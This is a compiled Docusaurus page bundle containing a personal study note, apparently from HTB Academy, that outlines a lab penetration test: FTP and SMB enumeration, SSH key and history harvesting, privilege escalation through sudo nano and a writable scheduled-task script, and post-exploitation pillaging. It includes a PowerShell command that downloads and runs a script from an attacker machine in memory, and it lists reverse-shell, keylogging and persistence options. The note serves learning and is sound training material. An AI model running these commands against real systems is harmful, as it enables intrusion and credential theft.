"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[6278],{220:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/pt-02a5af6942cfc4a2c3cb7ea20cca17d6.jpg"},3611:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>h,frontMatter:()=>t,metadata:()=>i,toc:()=>c});const i=JSON.parse('{"id":"Hacking/HTB Academy/Pentest In a Nutshell","title":"Pentest in a nutshell","description":"This should the overall process of a pentesting:","source":"@site/docs/Hacking/HTB Academy/Pentest In a Nutshell.md","sourceDirName":"Hacking/HTB Academy","slug":"/Hacking/HTB Academy/Pentest In a Nutshell","permalink":"/docs/Hacking/HTB Academy/Pentest In a Nutshell","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Linux fundamentals","permalink":"/docs/Hacking/HTB Academy/Linux fundamentals"},"next":{"title":"SQL injections","permalink":"/docs/Hacking/HTB Academy/SQL injections"}}');var a=s(4848),r=s(8453);const t={},o="Pentest in a nutshell",l={},c=[{value:"Linux information gathering",id:"linux-information-gathering",level:2},{value:"Linux System enumeration",id:"linux-system-enumeration",level:2},{value:"Linux Privilege Escalation.",id:"linux-privilege-escalation",level:2},{value:"Linux pillaging",id:"linux-pillaging",level:2},{value:"Windows information gathering",id:"windows-information-gathering",level:2},{value:"Windows System Enumeration",id:"windows-system-enumeration",level:2},{value:"Windows Privilege Escalation",id:"windows-privilege-escalation",level:2},{value:"Windows Pillaging",id:"windows-pillaging",level:2},{value:"Proof-of-Concept",id:"proof-of-concept",level:2}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"pentest-in-a-nutshell",children:"Pentest in a nutshell"})}),"\n",(0,a.jsx)(n.p,{children:"This should the overall process of a pentesting:"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"Pentesting process",src:s(220).A+"",width:"2048",height:"771"})}),"\n",(0,a.jsx)(n.p,{children:"Whenever you are blocked in any stage, remember what other stages can be reached from that stage. E.g: you need to do privilege escalation, but you haven't found the vulnerability yet."}),"\n",(0,a.jsx)(n.h2,{id:"linux-information-gathering",children:"Linux information gathering"}),"\n",(0,a.jsx)(n.p,{children:"If we discover FTP port listening:"}),"\n",(0,a.jsxs)(n.p,{children:["Try to log as ",(0,a.jsx)(n.code,{children:"anonymous"})," user. The FTP service will prompt us for a username and password, which, by default, are anonymous",":whatever","."]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ftp> ls\n\n229 Entering Extended Passive Mode (|||47456|)\n150 Opening ASCII mode data connection for file list\n-rw-rw-r--   1 john     john          964 Feb 15 22:14 WordPress_Blog_Setup_Update.txt\n226 Transfer complete\n"})}),"\n",(0,a.jsxs)(n.p,{children:["Here, we see that there is a file called WordPress_Blog_Setup_Update.txt, which might contains some interesting data for us. We also see that the file is owned by the user john . After we add these findings to our notes, we download the file using the ",(0,a.jsx)(n.code,{children:"get <filename>"})," command."]}),"\n",(0,a.jsxs)(n.p,{children:["Now check the empty files with ",(0,a.jsx)(n.code,{children:"ls -al"}),":"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ftp> ls -al\n\n229 Entering Extended Passive Mode (|||42851|)\n150 Opening ASCII mode data connection for file list\ndrwxr-x---   4 john     john         4096 Feb 16 17:28 .\ndrwxr-x---   4 john     john         4096 Feb 16 17:28 ..\n-rw-------   1 john     john         1153 Feb 15 21:13 .bash_history\n-rw-r--r--   1 john     john          220 Jan  6  2022 .bash_logout\n-rw-r--r--   1 john     john         3771 Jan  6  2022 .bashrc\ndrwx------   2 john     john         4096 Feb 15 17:16 .cache\n-rw-------   1 john     john           20 Feb 16 16:34 .lesshst\n-rw-r--r--   1 john     john          807 Jan  6  2022 .profile\ndrwxrwxr-x   2 john     john         4096 Feb 12 13:55 .ssh\n-rw-r--r--   1 john     john            0 Feb 11 10:18 .sudo_as_admin_successful\n-rw-------   1 john     john        17094 Feb 15 22:14 .viminfo\n-rw-rw-r--   1 john     john          964 Feb 15 22:14 WordPress_Blog_Setup_Update.txt\n226 Transfer complete\n"})}),"\n",(0,a.jsxs)(n.p,{children:["Each of these files could contain important information for us, but first we will download the ",(0,a.jsx)(n.code,{children:".bash_history"})," file (which can reveal the existence of certain programs, files, directories, access, and more.). By default, Bash saves the last 500-1000 commands in this file, though this number can be configured."]}),"\n",(0,a.jsxs)(n.p,{children:["Another potential goldmine is the ",(0,a.jsx)(n.code,{children:".ssh"})," directory. This directory (most of the time) is used to store files related to SSH, such as private keys, configs, and more:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ftp> cd .ssh\n\n250 CWD command successful\n\nftp> ls -al\n\n229 Entering Extended Passive Mode (|||26184|)\n150 Opening ASCII mode data connection for file list\n-rw-------   1 john     john         2602 Feb 12 13:55 id_rsa\n-rw-r--r--   1 john     john          565 Feb 12 13:55 id_rsa.pub\n226 Transfer complete\n"})}),"\n",(0,a.jsxs)(n.p,{children:["If a wordpress is discovered, we can enumerate more using ",(0,a.jsx)(n.code,{children:"wpscan"}),":"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"wpscan --url https://10.129.233.210 --disable-tls-checks\n"})}),"\n",(0,a.jsxs)(n.p,{children:["With the information we have from ",(0,a.jsx)(n.code,{children:"wpscan"}),", we can use ",(0,a.jsx)(n.code,{children:"metasplot"})," framework to check if we can get a reverse shell. Also the ",(0,a.jsx)(n.code,{children:".bash_history"})," reveales some credentials and we can connect using the ",(0,a.jsx)(n.code,{children:"id_rsa"})," file using normal SSH."]}),"\n",(0,a.jsx)(n.h2,{id:"linux-system-enumeration",children:"Linux System enumeration"}),"\n",(0,a.jsxs)(n.p,{children:["At this point, we have access to the machine. We are at ",(0,a.jsx)(n.code,{children:"Post-Exploitation"})," phase:"]}),"\n",(0,a.jsxs)(n.p,{children:["In the ",(0,a.jsx)(n.code,{children:"Exploitation"})," stage, we usually do not have any local or privileged access to any of the provided services of the target. However, in the ",(0,a.jsx)(n.code,{children:"Post-Exploitation"})," stage we do. In other words, ",(0,a.jsx)(n.code,{children:"Exploitation"})," stage is when we attack the target system from outside and ",(0,a.jsx)(n.code,{children:"Post-Exploitation"})," when we attack it from within."]}),"\n",(0,a.jsx)(n.p,{children:"In this phase, we need to collect at least the following pieces of information:"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"System Information: OS version, kernel version, architecture, and installed patches"}),"\n",(0,a.jsx)(n.li,{children:"User Information: Current user privileges, all users on the system, sudo rights"}),"\n",(0,a.jsx)(n.li,{children:"Network Information: Network interfaces, routing tables, active connections"}),"\n",(0,a.jsx)(n.li,{children:"Running Services: Active processes, listening ports, scheduled tasks"}),"\n",(0,a.jsx)(n.li,{children:"File System: Interesting files, permissions issues, mounted drives"}),"\n",(0,a.jsx)(n.li,{children:"Installed Software: Applications, versions, potential vulnerabilities"}),"\n",(0,a.jsx)(n.li,{children:"Security Mechanisms: Firewall rules, SELinux status, AppArmor profiles"}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"This information can be collected automatically using Linux Privilege Escalation Awesome Script (LinPEAS)."}),"\n",(0,a.jsx)(n.p,{children:"Now, we should analyze the output of linpeas for vulnerabilities for privilege escalation or lateral movement."}),"\n",(0,a.jsx)(n.h2,{id:"linux-privilege-escalation",children:"Linux Privilege Escalation."}),"\n",(0,a.jsx)(n.p,{children:"For privilege escalation on a Linux system, we aim to become the root user (aka superuser) on the target system."}),"\n",(0,a.jsxs)(n.p,{children:["Examine the output of ",(0,a.jsx)(n.code,{children:"sudo -l"}),":"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"john@ubuntu:~$ sudo -l\n\nMatching Defaults entries for john on ubuntu:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\\\:/snap/bin, use_pty\n\nUser john may run the following commands on ubuntu:\n    (root) NOPASSWD: /usr/bin/nano\n    (ALL : ALL) ALL\n"})}),"\n",(0,a.jsxs)(n.p,{children:["John can run ",(0,a.jsx)(n.code,{children:"/usr/bin/nano"})," as root without typing a password (NOPASSWD), making it extremely convenient to edit system files"]}),"\n",(0,a.jsx)(n.p,{children:"He can run any command as any user or group ((ALL : ALL) ALL), effectively granting full administrative privileges, though he must enter his password for all commands except for nano."}),"\n",(0,a.jsxs)(n.p,{children:["Now, we can go to GTFO bins to escape nano and land in a ",(0,a.jsx)(n.code,{children:"root"})," shell."]}),"\n",(0,a.jsx)(n.h2,{id:"linux-pillaging",children:"Linux pillaging"}),"\n",(0,a.jsx)(n.p,{children:"The term pillaging refers to the process of extracting valuable information from a compromised system for purposes such as privilege escalation, lateral movement, or data exfiltration. Now that we have the highest possible privileges, we can access sensitive files that were previously off-limits."}),"\n",(0,a.jsxs)(n.p,{children:["Now, we can run ",(0,a.jsx)(n.code,{children:"linpeas"})," as root, to see if it reveals more information that was not previously available. This means that we can find active credentials that are being used by the system. We can get access to ",(0,a.jsx)(n.code,{children:"root"})," id_rsa key, ",(0,a.jsx)(n.code,{children:".bash_history"}),", etc..."]}),"\n",(0,a.jsx)(n.h2,{id:"windows-information-gathering",children:"Windows information gathering"}),"\n",(0,a.jsxs)(n.p,{children:["Very similar to Linux, typically running ",(0,a.jsx)(n.code,{children:"nmap"})," and enumerate services running in the machine and their versions:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"sudo nmap -p- -sV -sC 10.129.12.20 -T5 -Pn\n"})}),"\n",(0,a.jsxs)(n.p,{children:["If you discover SMB shares, you can use ",(0,a.jsx)(n.code,{children:"crackmapexec"})," tool or ",(0,a.jsx)(n.code,{children:"nxc"})," tool to investigate further."]}),"\n",(0,a.jsxs)(n.p,{children:["Make sure to try to connect with ",(0,a.jsx)(n.code,{children:"NULL"})," account, i.e. empty user and password:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"crackmapexec smb 10.129.12.20 -u '' -p '' --users\n"})}),"\n",(0,a.jsxs)(n.p,{children:["Also, it's a good idea to check the ",(0,a.jsx)(n.code,{children:"Guest"})," account as well:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"crackmapexec smb 10.129.12.20 -u guest -p '' --shares\n"})}),"\n",(0,a.jsxs)(n.p,{children:["If it turns out we have valid credentials, we can try to search for file patterns. This is called ",(0,a.jsx)(n.code,{children:"spidering"}),": ",(0,a.jsx)(n.a,{href:"https://www.netexec.wiki/smb-protocol/spidering-shares",children:"https://www.netexec.wiki/smb-protocol/spidering-shares"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"crackmapexec smb 10.129.12.20 -u \"john\" -p 'SuperSecurePass123' --spider Devs --pattern .\ncrackmapexec smb 10.129.12.20 -u \"john\" -p 'SuperSecurePass123' --share Devs --get-file tmp.ps1 tmp.ps1\n"})}),"\n",(0,a.jsx)(n.p,{children:"It turns out this file reveals a PowerShell script with hardcoded credentials."}),"\n",(0,a.jsx)(n.h2,{id:"windows-system-enumeration",children:"Windows System Enumeration"}),"\n",(0,a.jsx)(n.p,{children:"Once we have the initial access to the Windows machine, we can enumerate it from inside."}),"\n",(0,a.jsx)(n.p,{children:"User information"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-ps1",children:"PS C:\\Users\\john> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State\n============================= ========================================= =======\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set            Enabled\n"})}),"\n",(0,a.jsx)(n.p,{children:"Now, let\u2019s take a look at the groups we are member of."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-ps1",children:"PS C:\\Users\\john> whoami /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                           Type             SID          Attributes\n==================================== ================ ============ ==================================================\nEveryone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\\\Event Log Readers            Alias            S-1-5-32-573 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\\\Remote Desktop Users         Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\\\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\\\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\\\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\\\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\\\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\\\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\\\High Mandatory Level Label            S-1-16-12288\n"})}),"\n",(0,a.jsxs)(n.p,{children:["We can use ",(0,a.jsx)(n.code,{children:"net"})," command as well:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-ps1",children:"PS C:\\Users\\john> net user john\n"})}),"\n",(0,a.jsx)(n.p,{children:"We can check scheduled tasks:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-ps1",children:"PS C:\\Users\\john> schtasks /query /fo LIST /v\n"})}),"\n",(0,a.jsx)(n.p,{children:"Similar to linpeas, it exists the winpeas script. We can run it without touching the disk with:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-ps1",children:"PS C:\\Users\\john> powershell \"IEX(New-Object Net.WebClient).downloadString('http://<attacking-machine-IP>:8080/winPEAS.ps1')\" > winpeas.txt\n"})}),"\n",(0,a.jsx)(n.p,{children:"This will list write permissions in unsual places, open ports, user information (SID, groups and privileges) and system information."}),"\n",(0,a.jsxs)(n.p,{children:["To check permissions on files, we can use ",(0,a.jsx)(n.code,{children:"icacls"}),", it manages NTFS file system permissions, specifically the discretionary access control lists (DACLs), allowing administrators to view, modify, grant, deny, or remove permissions on files and directories:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-ps1",children:'PS C:\\\\ProgramData> icacls "C:\\\\ProgramData\\\\CorpBackup\\\\Scripts\\\\backupprep.ps1"\n\nC:\\\\ProgramData\\\\CorpBackup\\\\Scripts\\\\backupprep.ps1 Everyone:(I)(F)\n                                                 NT AUTHORITY\\\\SYSTEM:(I)(F)\n                                                 BUILTIN\\\\Administrators:(I)(F)\n                                                 BUILTIN\\\\Users:(I)(RX)\n\nSuccessfully processed 1 files; Failed processing 0 files\n'})}),"\n",(0,a.jsx)(n.h2,{id:"windows-privilege-escalation",children:"Windows Privilege Escalation"}),"\n",(0,a.jsx)(n.p,{children:"Looks like we identified one scheduled task and we have write access to the script. We can perform:"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"Script modification for code injection - Add a user to the administrators group and add a reverse shell"}),"\n",(0,a.jsx)(n.li,{children:"Credential harvesting - Dump credentials or use it as a keylogger"}),"\n",(0,a.jsx)(n.li,{children:"Persistence via task hijacking - Append code to maintain access by creating a new scheduled task that runs our payload frequently"}),"\n",(0,a.jsx)(n.li,{children:"Changing Passwords - Change administrator\u2019s password and create a new RDP session as the user Administrator"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["Since the script is executed with ",(0,a.jsx)(n.code,{children:"Administrator"})," permission, we can use it to add the user to administrators group:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-ps1",children:'Add-LocalGroupMember -Group "Administrators" -Member "WIN01\\\\john"\n'})}),"\n",(0,a.jsxs)(n.p,{children:["Now, we wait two minutes and the user will be in the ",(0,a.jsx)(n.code,{children:"Administrators"})," group."]}),"\n",(0,a.jsx)(n.h2,{id:"windows-pillaging",children:"Windows Pillaging"}),"\n",(0,a.jsxs)(n.p,{children:["Now, we can run ",(0,a.jsx)(n.code,{children:"winpeas"})," script and will output some information that before was not accessible. Also there's the ",(0,a.jsx)(n.code,{children:"winpill.ps1"})," script that will automate retrieval of interesting data."]}),"\n",(0,a.jsx)(n.h2,{id:"proof-of-concept",children:"Proof-of-Concept"}),"\n",(0,a.jsx)(n.p,{children:"We can summarize the process of a pentest in the following steps:"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"Information Gathering"}),"\n",(0,a.jsx)(n.li,{children:"Vulnerability Assessment"}),"\n",(0,a.jsx)(n.li,{children:"Exploitation"}),"\n",(0,a.jsx)(n.li,{children:"Local Information Gathering"}),"\n",(0,a.jsx)(n.li,{children:"Local Vulnerability Assessment"}),"\n",(0,a.jsx)(n.li,{children:"Post-Exploitation (Privilege Escalation)"}),"\n",(0,a.jsx)(n.li,{children:"Privileged Local Information Gathering (Pillaging)"}),"\n",(0,a.jsx)(n.li,{children:"Privileged Local Vulnerability Assessment"}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>t,x:()=>o});var i=s(6540);const a={},r=i.createContext(a);function t(e){const n=i.useContext(r);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:t(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);